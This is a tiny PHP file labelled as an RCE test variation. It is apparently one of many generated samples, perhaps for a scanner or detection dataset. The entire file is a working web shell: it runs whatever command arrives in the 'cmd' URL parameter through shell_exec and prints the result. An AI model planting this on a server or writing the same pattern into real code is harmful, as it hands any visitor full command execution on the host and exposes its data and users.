<?php
// RCE test variation #791
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>